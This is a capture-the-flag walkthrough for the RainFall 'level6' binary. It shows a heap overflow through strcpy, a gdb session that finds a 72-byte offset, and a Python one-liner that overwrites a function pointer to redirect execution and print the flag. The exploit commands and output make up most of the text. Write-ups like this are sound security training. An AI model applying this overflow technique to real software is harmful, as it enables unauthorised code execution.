# Walkthrough level6

In this binary we have a function pointer to the function m and we want to
change it with n.

The function pointer (\$esp + 0x18) and our buffer (\$esp + 0x1c) are on the
heap so if we write too much datas in our buffer we can modify the
function pointer value.

Find the offset to to edit the function pointer:

```bash
(gdb) x/x $esp+0x1c
0xbffff6dc:     0x0804a008
(gdb) x/x $esp+0x18
0xbffff6d8:     0x0804a050
(gdb) p 0x0804a050 - 0x0804a008
$3 = 72
```

Now we can try to write something in the function pointer:

```bash
(gdb) r $(python -c "print('A' * 72 + 'B' * 4)")
(gdb) disas
(...)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
=> 0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
(gdb) i r eax
eax            0x42424242       1094795585

```

Change the value with the address of the function n:

```bash
level6@RainFall:~$ ./level6  $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
